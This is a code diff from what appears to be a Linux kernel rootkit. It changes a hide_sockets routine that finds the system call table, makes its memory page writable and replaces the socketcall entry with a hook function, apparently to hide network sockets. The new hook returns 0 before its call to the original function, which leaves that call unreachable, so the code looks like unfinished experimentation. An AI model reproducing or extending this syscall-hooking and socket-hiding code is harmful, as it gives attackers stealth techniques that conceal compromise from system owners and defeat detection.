@@ -7,7 +7,8 @@
 #include <net/net_namespace.h>
 #include <linux/socket.h>
 #include <linux/types.h>
-#include <asm/unistd.h>
+//#include <asm/unistd.h>
+#include <asm-generic/unistd.h>
 
 #include "sysmap.h"          /* Pointers to system functions */
 #include "global.h"
@@ -23,6 +24,8 @@ typedef int (*fun_int_seq_file_void) (struct seq_file*, void*);
 typedef asmlinkage long (*fun_long_int_struct_msghdr_unsigned)(int, struct msghdr __user*, unsigned);
 fun_long_int_struct_msghdr_unsigned orig_sendmsg;
 int nr_sys_sendmsg;
+typedef asmlinkage long (*fun_long_int_unsigned_long)(int, unsigned long __user*);
+fun_long_int_unsigned_long orig_socketcall;
 
 fun_ssize_t_int_pvoid_size_t     original_read;
 int_filep_voidp_filldir_t proc_original_readdir;
@@ -87,11 +90,17 @@ int find_syscall(void* addr){
 
 }
 
+asmlinkage long hooked_socketcall(int call, unsigned long __user* args){
+    OUR_DEBUG("hooked_socketcall\n");
+    return 0;
+    return orig_socketcall(call, args);
+}
+
 void hide_sockets(void){
     struct proc_dir_entry *p = init_net.proc_net->subdir;
     struct tcp_seq_afinfo *tcp_seq = 0;
     struct udp_seq_afinfo *udp_seq = 0;
-    void** syscall_table = ptr_sys_call_table;
+    void** syscall_table = (void*)ptr_sys_call_table;
     void** pointer_to_sys_sendmsg;
     int i;
     while (p){
@@ -121,11 +130,13 @@ void hide_sockets(void){
         pointer_to_sys_sendmsg++;
     }
     nr_sys_sendmsg = i;
-    OUR_DEBUG("Index: %d\n", i);
+    OUR_DEBUG("Index: %d\n", __NR_sendmsg);
     OUR_DEBUG("Found an address: %p => %p\n", pointer_to_sys_sendmsg, syscall_table[i]);
     orig_sendmsg = (fun_long_int_struct_msghdr_unsigned)*pointer_to_sys_sendmsg;
+    orig_socketcall = (fun_long_int_unsigned_long)syscall_table[__NR_socketcall];
     make_page_writable((long unsigned int)pointer_to_sys_sendmsg);
-    syscall_table[i] = hooked_sendmsg;
+    make_page_writable((long unsigned int)ptr_sys_call_table);
+    syscall_table[__NR_socketcall] = hooked_socketcall;
     OUR_DEBUG("New contents:     %p => %p\n", pointer_to_sys_sendmsg, syscall_table[i]);
 }
 
